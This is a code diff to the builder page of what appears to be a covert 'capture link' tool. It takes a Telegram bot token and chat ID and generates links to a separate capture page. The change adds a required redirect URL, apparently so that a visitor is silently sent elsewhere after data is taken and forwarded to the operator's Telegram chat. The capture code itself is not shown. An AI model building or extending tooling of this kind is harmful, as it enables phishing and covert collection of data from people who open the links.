@@ -15,6 +15,7 @@
         <h2>Make Your Capture Link</h2>
         <input type="text" id="token" placeholder="Telegram Bot Token" required>
         <input type="text" id="chatid" placeholder="Telegram Chat ID" required>
+        <input type="text" id="redirect" placeholder="Redirect URL (e.g. https://example.com)" required>
         <button onclick="generate()">Generate Link</button>
         <div id="result"></div>
     </div>
@@ -22,13 +23,14 @@
         function generate() {
             const token = encodeURIComponent(document.getElementById('token').value.trim());
             const chat = encodeURIComponent(document.getElementById('chatid').value.trim());
-            if (!token || !chat) {
-                alert("Please Enter Both Token & Chat ID");
+            const redirect = encodeURIComponent(document.getElementById('redirect').value.trim());
+            if (!token || !chat || !redirect) {
+                alert("Please Enter Token, Chat ID, and Redirect URL");
                 return;
             }
-            // Change the base URL to your hosting address:
+            // Change the base URL if needed, default: same folder
             const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'capture.html';
-            const link = `${baseUrl}?token=${token}&chat=${chat}`;
+            const link = `${baseUrl}?token=${token}&chat=${chat}&redirect=${redirect}`;
             document.getElementById('result').innerHTML = `<b>Your Link:</b><br><a href="${link}" target="_blank">${link}</a>`;
         }
     </script>
